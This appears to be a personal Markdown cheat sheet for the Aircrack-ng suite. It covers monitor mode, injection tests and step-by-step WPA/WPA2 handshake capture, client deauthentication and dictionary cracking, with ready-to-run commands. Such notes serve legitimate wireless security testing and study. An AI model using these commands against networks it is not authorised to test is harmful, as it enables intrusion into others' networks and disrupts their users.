# Aircrack-ng

## General

Show interfaces, chipsets and drivers:


```bash

airmon-ng

```

Start monitor mode on specific interface (network card):


```bash

sudo airmon-ng start wlx0008caa46de5

```


Start packet capture on specific interface (network card):

```bash

sudo airodump-ng wlx0008caa46de5

```

Test packet injection and quality:

```bash

sudo aireplay-ng --test wlan0mon

```

Crack a WEP or WPA key without user intervention and collaborate with WPA cracking statistics:

```bash

besside-ng

```

## Tests

### Test capabilities (monitor mode and package injection)

- start monitor mode for specific wi-fi interface (`wlan0` - wi-fi interface from `iwconfig` list):

```bash

sudo airmon-ng start wlan0

```
- unblock (from soft block) wi-fi interfaces if needed (optional):

```bash

sudo rfkill unblock all

```

- test capabilities (`wlan0mon` - new wi-fi interface which should appear after monitor mode was enabled during previous step):

```bash

sudo aireplay-ng --test wlan0mon

```

## Attacks

### WPA/WPA2 Dictionary Attack

- find out the BSSID of the access point;

- decide on the wordlist that should be used for the attack;

- capture a legitimate user connecting to the access point;

- generate the authentication traffic;

- capture a legitimate user connecting to the access point;

- execute the dictionary attack;

#### Method 1 (not complete) - steps

- find virtualized Kali Linux LAN adapter that were successfully bridged to current device using `iwconfig`;

- turn off LAN adapter using `sudo ifconfig wlan0 down`;

- put LAN adapter into 'monitor mode' using `sudo iwconfig wlan0 mode monitor`;

- turn on LAN adapter using `sudo ifconfig wlan0 up`;

- confirm that LAN adapter is in 'monitor mode' using `iwconfig`;

- find the BSSID and chanel of the access point using `sudo airodump-ng wlan0`;

- capture the 4-way authentication handshake for the AP: `sudo airodump-ng --bssid 00:11:22:33:44:55:66 --channel 1 --write wepcracking wlan0`;

- crack the password using following command: `sudo aircrack-ng wepcracking-01.cap` (`wepcracking-01.cap` - file which were generated by previous command);

#### Method 2 (complete, tested) - steps

- find virtualized Kali Linux LAN adapter that were successfully bridged to current device using `iwconfig`;

- turn off LAN adapter using `sudo ifconfig wlan0 down`;

- put LAN adapter into 'monitor mode' using `sudo iwconfig wlan0 mode monitor`;

- turn on LAN adapter using `sudo ifconfig wlan0 up`;

- confirm that LAN adapter is in 'monitor mode' using `iwconfig`;

- find the BSSID and chanel of the access point using `sudo airodump-ng wlan0`;

- capture the 4-way authentication handshake for the AP using `airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0`;

- deauthenticate the wireless client in order to capture the handshake (may need to run multiple times, optional step) using `aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0`;

- crack the password using dictionary using `aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap`;

#### Notes

WPA/WPA2 supports many types of authentication beyond pre-shared keys. Aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng shows the network as having the authentication type of PSK, 
otherwise, don't bother trying to crack it. Only plain brute force techniques can be used against WPA/WPA2.
